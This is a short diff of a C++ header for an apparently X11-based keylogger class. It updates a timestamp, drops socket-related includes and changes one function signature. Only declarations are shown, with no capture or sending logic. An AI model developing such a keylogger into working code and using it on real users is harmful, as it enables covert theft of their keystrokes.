@@ -5,7 +5,7 @@
 // Login   <vianney@bouchaud.org>
 // 
 // Started on  Wed Oct  5 13:59:20 2011 Vianney Bouchaud
-// Last update Thu Oct  6 19:04:04 2011 Vianney Bouchaud
+// Last update Wed Oct 26 15:01:44 2011 Vianney Bouchaud
 //
 
 #ifndef __KEYLOGGER_HH__
@@ -24,11 +24,6 @@
 #include <unistd.h>
 #include <exception>
 #include <string>
-#include <iostream>
-#include <stdio.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <netdb.h>
 
 struct		CallbackClosure {
   Display	*ctrlDisplay;
@@ -54,7 +49,7 @@ public:
   void			start();
   void			stop();
   void			processData();
-  bool			xConnect(std::string displayName);
+  bool			xConnect(const std::string &displayName);
 
 private:
   std::string		m_displayName;
